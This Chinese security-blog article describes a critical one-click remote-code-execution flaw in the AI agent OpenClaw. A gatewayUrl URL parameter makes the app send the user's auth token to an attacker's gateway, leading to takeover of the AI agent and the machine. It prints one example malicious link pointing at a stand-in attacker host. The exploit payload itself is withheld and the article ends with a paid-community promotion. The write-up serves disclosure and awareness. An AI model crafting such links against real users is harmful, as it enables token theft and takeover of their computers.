#  【AI安全】OpenClaw 爆出 9.8 分顶级 RCE 漏洞！仅需一个链接  
原创 Oxo Security
                    Oxo Security  Oxo Security   2026-02-04 11:37  
  
# 一、 权限“缝合怪”的陨落：10万开发者背后的安全黑洞 😱  
##### AI 时代！人人都在深耕 AI 安全，你缺的就是这关键一步！🚀  
  
安全圈已经“卷”向 AI 了！错过这个关键点，可能正在被时代边缘化。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RBozUQPW9c9uzmFRqtCIwuQZzWHXcLVTmoTfLpES3uxw9DESYkLhm5xOCiaXLNAr5BoudicDsXRdhGCd8T6Sib5VQ/640?wx_fmt=png&from=appmsg "")  
  
OpenClaw（也就是大家熟知的 ClawdBot 或 Moltbot）在开源界的名声可谓如耳。作为一个拥有超过 10 万名开发者粉丝的 AI 个人助理，它之所以走红，靠的就是那一手“暴力”的权限整合能力。它不仅能帮你发邮件、管理日程，甚至还能直接调用你的 API Key，控制你的本地计算机执行各种复杂的脚本。开发者们亲切地称它为“拥有上帝模式的数字大脑” 🧠。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RBozUQPW9c8icZJx8DSy1BzXsws7saKibk4ROamAsSfDpQQXK9CmZAPNV1HXD1J5icIQ9aktlTqlic3weU6yFvp1yA/640?wx_fmt=png&from=appmsg "")  
  
然而，站得越高，摔得越惨。这种“上帝模式”带来的不仅仅是效率的飞跃，更是安全边界的全面崩塌。最近，来自 depthfirst 全球安全情报中心的专家们揪出了一个足以让整个开源 AI 社区彻夜难眠的惊天漏洞。这个漏洞的破坏力被定性为 **CVSS 9.8（危急）**  
，意味着黑客可以在不需要你输入任何密码、不需要你同意任何操作的情况下，通过一个看起来人畜无害的链接，直接接管你的整台电脑 💻。  
  
我们可以通过下面这个表格，一眼看清这次危机的全貌：  
<table><thead><tr><th style="padding: 12px 15px;text-align: left;font-weight: 600;color: #1d1d1f;border-bottom: 1.5px solid rgba(0,0,0,0.1);background: #fbfbfd;"><section><span leaf="">关键属性</span></section></th><th style="padding: 12px 15px;text-align: left;font-weight: 600;color: #1d1d1f;border-bottom: 1.5px solid rgba(0,0,0,0.1);background: #fbfbfd;"><section><span leaf="">详细内容</span></section></th></tr></thead><tbody><tr><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;background: rgba(0,0,0,0.02);"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">受影响产品</span></strong></td><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;background: rgba(0,0,0,0.02);"><section><span leaf="">OpenClaw (原 ClawdBot/Moltbot)</span></section></td></tr><tr><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">漏洞类型</span></strong></td><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;"><section><span leaf="">不安全的 URL 参数处理 + 跨站 WebSocket 劫持 (CSWSH)</span></section></td></tr><tr><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;background: rgba(0,0,0,0.02);"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">核心威胁</span></strong></td><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;background: rgba(0,0,0,0.02);"><section><span leaf="">未经授权的远程代码执行 (RCE)</span></section></td></tr><tr><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">危险等级</span></strong></td><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">Critical (9.8+)</span></strong></td></tr><tr><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;background: rgba(0,0,0,0.02);"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">攻击门槛</span></strong></td><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;background: rgba(0,0,0,0.02);"><section><span leaf="">极低（诱导点击单个恶意链接）</span></section></td></tr><tr><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;"><strong style="font-weight: 600;background-image: linear-gradient(135deg, #007aff, #5856d6);-webkit-background-clip: text;background-clip: text;color: transparent;"><span leaf="">用户感知</span></strong></td><td style="padding: 10px 15px;border-bottom: 1px solid rgba(0,0,0,0.05);color: #333333;"><section><span leaf="">零感知，无需交互即可中招</span></section></td></tr></tbody></table>  
这不仅仅是一个简单的 Bug，它更像是一把黑客专门为 AI 时代定制的“万能钥匙”。OpenClaw 为了追求极致的用户体验，允许 AI 代理无缝接入各类聊天应用和本地环境，却偏偏在最基础的网络连接验证上掉进了一个低级陷阱。当高权限遇到了低防守，一场安全海啸就此爆发 🌊。  
# 二、 三重逻辑死穴：黑客是如何悄无声息“白嫖”你电脑的？ 🧐  
  
这次的漏洞并不是单一的代码错误，而是三个看似不起眼的逻辑缺陷被黑客巧妙地“串联”在了一起。就像三道原本关着的门，黑客发现只要同时推一下，门缝就会合拢成一条通向你核心隐私的高速公路。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RBozUQPW9c8icZJx8DSy1BzXsws7saKibkFMRibfv01VaphzKdGP8ElrhhvbNCFIedHBw65OrgiaqXUKtYmM2oWbyw/640?wx_fmt=png&from=appmsg "")  
  
第一个死穴藏在 OpenClaw 的 app-settings.ts  
 模块中。在这里，系统存在一个非常致命的习惯：它会盲目地接受来自 URL 的 gatewayUrl  
 查询参数。简单来说，只要你在链接里塞进一个服务器地址，OpenClaw 就会毫不怀疑地把它存进浏览器的 localStorage  
（本地存储）里。这就好比一个不看身份证的酒店前台，只要你说你是老板的朋友，他就直接把万能房卡交给了你 🏨。  
  
第二个死穴紧随其后，出现在 app-lifecycle.ts  
 模块。当程序启动或者重新加载时，它会自动触发 connectGateway()  
 函数。最离谱的地方来了：这个函数在尝试连接攻击者指定的那个“恶意网关”时，会非常“大方”地把你的 authToken  
（身份验证令牌）直接打包发过去。黑客甚至不需要去偷你的钥匙，你的系统会自己把钥匙乖乖送到黑客的服务器上 🗝️。  
  
为了让大家看得更直白，我们把这套“夺命三连击”的操作拆解开：  
1. 1. **注入阶段 (Blind Ingestion)**  
：黑客发给你一个特制的链接，例如 https://openclaw-app.io/?gatewayUrl=attacker-server.com  
。你点开之后，前端代码立刻就把攻击者的服务器地址记在了心里。  
  
1. 2. **泄露阶段 (Auto-Leak)**  
：OpenClaw 自动开始尝试连接这个新地址。在握手过程中，为了证明自己是“合法用户”，它会主动把你的敏感令牌发给 attacker-server.com  
。  
  
1. 3. **接管阶段 (Takeover)**  
：黑客拿到了你的令牌，现在他就是你，或者说，他已经是你 AI 助手的最高指挥官了 🎖️。  
  
这种攻击最阴险的地方在于，它利用了 AI 代理对“网关”连接的极度信任。在现有的 AI 架构中，很多开发者往往弱化了对网关地址的二次校验。这种对便利性的盲目追求，直接导致了安全红线的全面失守。  
# 三、 逻辑闭环：WebSocket 劫持与“沙箱”爆破的技术细节 💥  
  
🎯 **【AI 漏洞深度挖掘】**  
  
**为何黑客只需一个 WebSocket 连接就能让沙箱形同虚设？从浏览器到宿主机的“降维打击”究竟是如何完成闭环的？**  
  
欲获取本章节关于 CSWSH 劫持的具体 Payload 与攻击链条完整细节，请加入 **Oxo AI Security 知识星球**  
。在星球内部，我们为您准备了深度技术拆解，帮助您彻底掌握大模型工具的安全命门。此外，星球还提供丰富…  
- • 📚 **AI 文献解读**  
：最前沿的 LLM 安全论文深度剖析。  
  
- • 🐛 **AI 漏洞情报**  
：第一时间掌握主流大模型的 0-day 漏洞与越狱方式。  
  
- • 🛡 **AI 安全体系**  
：从红队攻击到蓝队防御的全方位知识图谱。  
  
- • 🛠 **AI 攻防工具**  
：红队专属的自动化测试与扫描工具箱。  
  
🚀 立即加入 **Oxo AI Security 知识星球**  
，掌握AI安全攻防核心能力！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RBozUQPW9c86l9BKV2TcgrjKw8B41ge3ibibq5qqLoNW0aJYvEfAAibSfRgU74vleMaXJ2chff1d7sk5B7xHcI6iaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/RBozUQPW9c86l9BKV2TcgrjKw8B41ge30c1ib8vQunnAo8BIkojRnd5y8VoLeTxpl6czmSXAI91OxicJEaAibrGgA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
